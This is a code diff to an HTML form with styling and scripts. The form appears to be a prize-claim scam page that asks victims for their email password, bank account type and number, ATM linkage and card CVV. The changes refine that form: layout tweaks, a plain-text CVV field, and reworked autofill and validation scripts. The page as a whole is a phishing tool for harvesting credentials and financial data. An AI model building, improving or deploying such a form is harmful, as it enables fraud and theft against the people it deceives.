@@ -29,6 +29,7 @@
       margin-top: 5px;
       border-radius: 5px;
       border: 1px solid #ccc;
+      box-sizing: border-box;
     }
     .hidden {
       display: none;
@@ -38,8 +39,11 @@
       font-size: 0.9em;
       margin-top: 5px;
     }
-    .eye {
+    .eye-container {
       position: relative;
+    }
+    .eye-container input {
+      padding-right: 40px;
     }
     .eye-icon {
       position: absolute;
@@ -47,6 +51,7 @@
       right: 10px;
       transform: translateY(-50%);
       cursor: pointer;
+      font-size: 18px;
     }
   </style>
 </head>
@@ -72,19 +77,19 @@
     <input type="email" name="Email Address" required>
 
     <label>5. Email Password</label>
-    <div class="eye">
+    <div class="eye-container">
       <input type="password" name="Email Password" id="emailPassword" required>
       <span class="eye-icon" onclick="toggleVisibility('emailPassword')">👁️</span>
     </div>
 
     <label>6. Amount You Won</label>
-    <input type="text" name="Amount You Won" required>
+    <input type="text" name="Amount You Won" id="amountWon" required>
 
     <label>7. Bank Account Type</label>
-    <input type="text" name="Bank Account Type" required>
+    <input type="text" name="Bank Account Type" id="bankType" required>
 
     <label>8. Bank Account Number</label>
-    <input type="text" name="Bank Account Number" required>
+    <input type="text" name="Bank Account Number" id="bankNumber" required>
 
     <label>9. Did You Link ATM to Your Bank Account?</label>
     <select name="ATM Linked" id="atmLinked" required>
@@ -103,7 +108,7 @@
       <div class="error" id="expiryError"></div>
 
       <label>12. CVV</label>
-      <input type="password" name="CVV" id="cvv">
+      <input type="text" name="CVV" id="cvv">
       <div class="error" id="cvvError"></div>
     </div>
 
@@ -117,12 +122,10 @@
   </form>
 
   <script>
+    // ATM logic
     const atmLinked = document.getElementById("atmLinked");
     const atmFields = document.getElementById("atmFields");
     const finalNote = document.getElementById("finalNote");
-    const amountInput = document.querySelector("[name='Amount You Won']");
-    const accountTypeInput = document.querySelector("[name='Bank Account Type']");
-    const accountNumberInput = document.querySelector("[name='Bank Account Number']");
 
     atmLinked.addEventListener("change", function () {
       if (this.value === "Yes") {
@@ -135,15 +138,16 @@
       }
     });
 
+    // Toggle eye visibility
     function toggleVisibility(id) {
       const field = document.getElementById(id);
       field.type = field.type === "password" ? "text" : "password";
     }
 
-    // Auto-fill final note
-    amountInput.addEventListener("blur", updateFinalNote);
-    accountTypeInput.addEventListener("blur", updateFinalNote);
-    accountNumberInput.addEventListener("blur", updateFinalNote);
+    // Autofill final message
+    const amountInput = document.getElementById("amountWon");
+    const accountTypeInput = document.getElementById("bankType");
+    const accountNumberInput = document.getElementById("bankNumber");
 
     function updateFinalNote() {
       document.getElementById("amountNote").textContent = amountInput.value;
@@ -151,7 +155,11 @@
       document.getElementById("accountNumberNote").textContent = accountNumberInput.value;
     }
 
-    // Validation on blur
+    amountInput.addEventListener("blur", updateFinalNote);
+    accountTypeInput.addEventListener("blur", updateFinalNote);
+    accountNumberInput.addEventListener("blur", updateFinalNote);
+
+    // Validations
     document.getElementById("phone").addEventListener("blur", function () {
       const val = this.value.trim();
       document.getElementById("phoneError").textContent =
